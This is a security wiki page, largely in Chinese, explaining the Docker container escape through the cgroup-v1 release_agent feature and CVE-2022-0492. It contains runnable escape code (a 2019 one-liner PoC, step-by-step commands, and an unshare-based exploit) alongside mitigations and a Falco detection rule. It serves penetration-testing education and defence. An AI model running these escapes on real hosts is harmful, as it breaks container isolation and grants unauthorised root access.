# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**有关更多详细信息，请参阅** [**原始博客文章**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**。** 这只是一个摘要：

---

## 经典 PoC (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
PoC 利用 **cgroup-v1** 的 `release_agent` 特性：当一个 cgroup 的最后一个任务退出时，如果该 cgroup 设置了 `notify_on_release=1`，内核（在 **主机的初始命名空间中**）会执行存储在可写文件 `release_agent` 中的程序路径。由于该执行是在 **主机上具有完全的 root 权限**，因此获得对该文件的写入访问权限就足以实现容器逃逸。

### 简短、易读的操作步骤

1. **准备一个新的 cgroup**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # 或 –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **将 `release_agent` 指向主机上攻击者控制的脚本**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **投放有效载荷**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **触发通知器**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # 添加自己并立即退出
cat /output                                  # 现在包含主机进程
```

---

## 2022 内核漏洞 – CVE-2022-0492

在 2022 年 2 月，Yiqi Sun 和 Kevin Wang 发现 **内核在进程写入 cgroup-v1 中的 `release_agent` 时并未验证能力**（函数 `cgroup_release_agent_write`）。

实际上 **任何能够挂载 cgroup 层次结构的进程（例如通过 `unshare -UrC`）都可以在 *初始* 用户命名空间中写入任意路径到 `release_agent`，而无需 `CAP_SYS_ADMIN`**。在默认配置、以 root 运行的 Docker/Kubernetes 容器中，这允许：

* 提升到主机上的 root 权限；↗
* 在容器未被提升的情况下实现容器逃逸。

该缺陷被分配为 **CVE-2022-0492**（CVSS 7.8 / 高）并在以下内核版本中修复（以及所有后续版本）：

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299。

补丁提交：`1e85af15da28 "cgroup: Fix permission checking"`。

### 容器内的最小利用代码
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
如果内核存在漏洞，来自 *host* 的 busybox 二进制文件将以完全 root 权限执行。

### 加固与缓解措施

* **更新内核** (≥ 版本以上)。该补丁现在要求在 *initial* 用户命名空间中具有 `CAP_SYS_ADMIN` 才能写入 `release_agent`。
* **优先使用 cgroup-v2** – 统一层次 **完全移除了 `release_agent` 功能**，消除了这一类的逃逸。
* **禁用不需要的非特权用户命名空间**：
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **强制访问控制**：AppArmor/SELinux 策略拒绝在 `/sys/fs/cgroup/**/release_agent` 上执行 `mount`、`openat`，或丢弃 `CAP_SYS_ADMIN`，即使在易受攻击的内核上也能阻止该技术。
* **只读绑定掩码** 所有 `release_agent` 文件（Palo Alto 脚本示例）：
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## 运行时检测

[`Falco`](https://falco.org/) 自 v0.32 起提供内置规则：
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
规则在容器内仍然拥有 `CAP_SYS_ADMIN` 的进程尝试写入 `*/release_agent` 时触发。

## 参考

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – 详细分析和缓解脚本。
* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
